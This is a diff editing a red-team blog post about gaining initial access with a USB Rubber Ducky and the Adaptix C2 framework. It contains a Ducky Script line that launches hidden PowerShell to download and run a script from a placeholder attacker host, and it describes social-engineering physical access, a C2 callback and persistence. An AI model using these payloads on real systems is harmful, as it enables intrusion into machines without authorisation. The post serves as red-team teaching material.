@@ -1,16 +1,15 @@
 ---
 title: "Getting Initial Access with USB Rubber Ducky + Adaptix C2"
 date: 2026-04-19
-tags: artificial-intelligence, appsec, automation, bug-bounty
+tags: Intial Access, Red Team, Physical Security, Hacker gadgets
 description: A walkthrough of USB Rubber Ducky from USB to Shell and Chaining with Adaptix C2 for Initial Access.
 ---
 
 Welcome back to another Hak5 toolkit series. If you went through the LAN Turtle write-up and enjoyed it, I think you might like this one just as much. In this post, I will be shifting into a more hands-on approach exploring how to create both simple and advanced payloads using the USB Rubber Ducky and connect it with our C2 infrastructure to simulate a reverse connection. What's interesting is that setting this up takes far less effort than most people would expect, especially when compared to traditional exploitation techniques.
 
-Welcome back to another Hak5 toolkit series. If you went through the LAN Turtle write-up and enjoyed it, I think you might like this one just as much. In this post, I will be shifting into a more hands-on approach exploring how to create both simple and advanced payloads using the USB Rubber Ducky and connect it with our C2 infrastructure to simulate a reverse connection. What's interesting is that setting this up takes far less effort than most people would expect, especially when compared to traditional exploitation techniques.
-
 ### Hypothesis
-To put things into perspective, imagine you're part of an internal red team exercise and you're trying to gain initial access to a target machine. Nothing seems to work. There are no exploitable vulnerabilities, all systems are fully patched, and endpoint defenses are well configured. In short, as we'd say locally, "kumekauka." It feels like the defenders anticipated every move you might make.
+To put things into perspective, imagine you're part of an internal red team exercise and you're trying to gain initial access to a target machine. Nothing seems to work. There are no exploitable vulnerabilities, all systems are fully patched, and endpoint defenses are well configured. In short, as we'd say locally, "kumekauka" .<br><br>
+It feels like the defenders anticipated every move you might make.
 At this point, instead of continuing to push technical exploits, you shift your approach. You notice that USB ports are not disabled and this opens up an entirely different attack vector. With a bit of social engineering whether it's interacting with reception, HR, or simply gaining a moment of physical access you can plug in a device that looks completely harmless. Within seconds, it executes pre-programmed keystrokes, triggers a payload, and establishes a reverse connection back to your command and control infrastructure. Just like that, you achieve initial access without triggering the usual alarms.
  
  
@@ -25,23 +24,21 @@ GUI r
 STRING powershell -nop -w hidden -c "IEX (New-Object Net.WebClient).DownloadString('http://attacker/payload.ps1')"
 ENTER
 ```
-- **Encoder**
-- Converts Ducky Script to binary (`inject.bin`) and tthis is what the device actually executes. This can be complied through Hak5 PayloadStudio (cloud IDE) or the ducktools encoder.
+- **Encoder**: Converts Ducky Script to binary (`inject.bin`) and tthis is what the device actually executes. This can be complied through Hak5 PayloadStudio (cloud IDE) or the ducktools encoder.
 - **Microcontroller**:  Inside the Rubber Ducky and handles USB communication and keystroke injection
 - **Storage (microSD or onboard)**: Stores the compiled payload (`inject.bin`)
 - **USB HID Interface**: Presents itself as a keyboard to the host system
 
-Its something like below
+Its Looks like below
 ![](../static/img/Ducky/Pasted%20image%2020260418002842.png)
 
 ### Setting up Adaptix C2
-For this blogs , we will  be using Adaptix C2. I won’t go too deep into the installation process or dive into the internals, since our focus is on payload generation, but the idea is to get it up and running out of the box so we can use it to generate the binary that will be used for our reverse connection.
+For this blog, we will  be using Adaptix C2. I won’t go too deep into the installation process or dive into the internals, since our focus is on payload generation, but the idea is to get it up and running out of the box so we can use it to generate the binary that will be used for our reverse connection.<br>
 
-To get started, follow the installation steps and make sure all the required packages and prerequisites are installed.
-At a high level, Adaptix has two components after installation the Server (teamserver) and the Client (GUI). 
+To get started, follow the installation steps and make sure all the required packages and prerequisites are installed. At a high level, Adaptix has two components after installation the Server (teamserver) and the Client (GUI). 
 
 1. **The server** - responsible for managing all communications coming from the beacon , it handles listener orchestration, agent registration, task queuing, and data storage. 
-2. **The client** - operator interface where you interact with your beacons, issue commands, view results, and manage the engagement. It supports multiplayer, so multiple operators can connect to the same teamserver simultaneously.
+2. **The client** - operator interface where you interact with your beacons, issue commands, view results, and manage the engagement. It supports multiplayer, so multiple operators can connect to the same teamserver simultaneously.<br>
 
 
 If you have worked with Cobalt Strike before, you will find Adaptix somewhat familiar in terms of how it handles command and control and payload deployment. It actually reminded me of my experience preparing for the CRTO, which is still one of the most practical red team certifications I have taken. I find it lightweight, easy to use, and supports extensions (BOFs), which makes it flexible for different use cases. The fact that it’s open source also means there’s a lot of community contribution, which is always a plus.
@@ -60,11 +57,11 @@ sudo ./AdaptixClient
 ![](../static/img/Ducky/Pasted%20image%2020260417030516.png)
 
 
-##### Installing Extension Kit
+#### Installing Extension Kit
 ![](../static/img/Ducky/Pasted%20image%2020260417210950.png)
 ![](../static/img/Ducky/Pasted%20image%2020260417211408.png)
 
-Installing the Extensions
+
 ![](../static/img/Ducky/Pasted%20image%2020260417212824.png)
 ![](../static/img/Ducky/Pasted%20image%2020260417212603.png)
 
@@ -122,7 +119,7 @@ the figure below the steps for execution
 ![](../static/img/Ducky/Pasted%20image%2020260418232529.png)
 
 The payload looks as below
-```js
+```python
 
 REM --- Step 1: Initialization ---
 DEFAULT_DELAY 100
@@ -174,6 +171,7 @@ ENTER
 
 Once we have developed the script,we can compile it using the Payload Studio.  After compiling, you will get an inject.bin file. ttransfer this file to the Rubber Ducky’s storage (SD card). Once copied, safely eject the device, plug it into your target system (in your controlled lab or authorized environment), and it will execute the script automatically.
 ![](../static/img/Ducky/Pasted%20image%2020260418012304.png)
+
 #### Execution and Callback
 Plug the Ducky into the target machine's USB port. The entire sequence executes in seconds. On your terminal running the Python HTTP server, you should see the following
 ![](../static/img/Ducky/Pasted%20image%2020260418011951.png)
@@ -202,3 +200,6 @@ From here, you're operating within the Adaptix framework and can begin post-expl
 The USB Rubber Ducky paired with a capable C2 framework like Adaptix demonstrates how physical access, even momentary, can completely bypass the most hardened technical defenses. What we walked through from a basic whoami to a full recon-evasion-persistence chain with C2 callback is the kind of attack that takes under 15 seconds of physical access and produces a persistent foothold.
 
 In a red team context, this is a powerful reminder that security is not just about firewalls and patches  it's about the full attack surface, including the physical layer
+
+
+### References
